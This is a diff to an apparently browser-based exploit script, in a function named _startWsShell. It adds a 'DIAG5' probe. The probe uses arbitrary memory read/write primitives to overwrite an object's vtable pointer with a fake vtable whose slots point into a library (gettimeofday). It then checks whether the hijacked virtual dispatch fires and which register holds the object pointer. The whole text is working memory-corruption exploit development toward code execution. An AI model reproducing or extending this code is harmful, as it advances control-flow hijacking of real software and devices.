@@ -6244,6 +6244,21 @@ function _startWsShell(){
           var isDiag2=(msg.diag==='2');
           var isDiag3=(msg.diag==='3');
           var isDiag4=(msg.diag==='4');
+          var isDiag5=(msg.diag==='5');
+          if(isDiag5){
+            /* DIAG5: THE RECOVERABLE DISPATCH PROBE (session-190: the diag3
+             * crash = the dispatch FIRES - thr_self wrote the tid over
+             * [FO+0] = the vtable pointer -> the next virtual jumped to it).
+             * THE RECOVERABLE VERSION: gettimeofday (lk+0xB50: writes 16
+             * recognizable time bytes at [RDI]) at +0x18 AND +0x20 - the
+             * primary table keeps the REAL VP slots (the copied FAKEVT) -
+             * the time-write lands at [FO] (RDI=FO) or [FO+0x20] (the
+             * secondary this-adjustment) - EITHER = the dispatch PROVEN
+             * + the RDI question ANSWERED - both slots saved+restorable */
+            S.absWrite(FAKEVT+0x18n,lkF+0xB50n);
+            S.absWrite(FAKEVT+0x20n,lkF+0xB50n);
+            FB2('D5 DIAG5: gettimeofday at +0x18/+0x20 (the recoverable probe)');
+          }
           if(isDiag4){
             /* DIAG4: THE BUCKET CLIENT (the boot's own analysis line:
              * 'client at self+0xB8 so base block at client-0x20=self+0x98
@@ -6307,7 +6322,12 @@ function _startWsShell(){
           var mb0Pre=0n,mb20Pre=0n;
           var fo20Pre=0n;
           var c98Pre=0n;
-          if(isDiag4){
+          if(isDiag5){
+            fo20Pre=S.absRead(FO+0x20n,8)[0];
+            S.absWrite(FO,FAKEVT);
+            S.absWrite(FO+0x20n,FAKEVT);
+            reply._5='armed';
+          } else if(isDiag4){
             var CLI=0n;
             try{CLI=BigInt('0x'+(localStorage.getItem('v688_cli')||'0'));}catch(eC4){}
             if(!(CLI>=0x1000000000n)){
@@ -6357,7 +6377,18 @@ function _startWsShell(){
           var witPost=S.absRead(WIT,8)[0];
           FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
           /* (8b) THE DIAG READBACKS (correctly after the trigger) */
-          if(isDiag4){
+          if(isDiag5){
+            var f0n=S.absRead(FO,8)[0];
+            var f20n=S.absRead(FO+0x20n,8)[0];
+            reply.FO0now='0x'+f0n.toString(16);
+            reply.FO20now='0x'+f20n.toString(16);
+            if(f0n!==FAKEVT){FB2('D5 *** [FO+0] CHANGED: 0x'+f0n.toString(16)+' - RDI=FO - THE DISPATCH FIRED ***');reply.dispatchProven=true;reply.rdiIs='FO';}
+            if(f20n!==FAKEVT){FB2('D5 *** [FO+0x20] CHANGED: 0x'+f20n.toString(16)+' - RDI=FO+0x20 (the secondary this) - THE DISPATCH FIRED ***');reply.dispatchProven=true;reply.rdiIs='FO+0x20';}
+            if(f0n===FAKEVT&&f20n===FAKEVT){FB2('D5 no change - no dispatch this window');}
+            S.absWrite(FO,vpOrig);
+            S.absWrite(FO+0x20n,fo20Pre);
+            FB2('D5 both restored (0x'+vpOrig.toString(16)+' / 0x'+fo20Pre.toString(16)+')');
+          } else if(isDiag4){
             var cliNow=S.absRead(CLI,8)[0];
             var cliVtNow=S.absRead(CLI-0x20n,8)[0];
             FB2('D4 [cli]=0x'+cliNow.toString(16)+' [cli-0x20]=0x'+cliVtNow.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
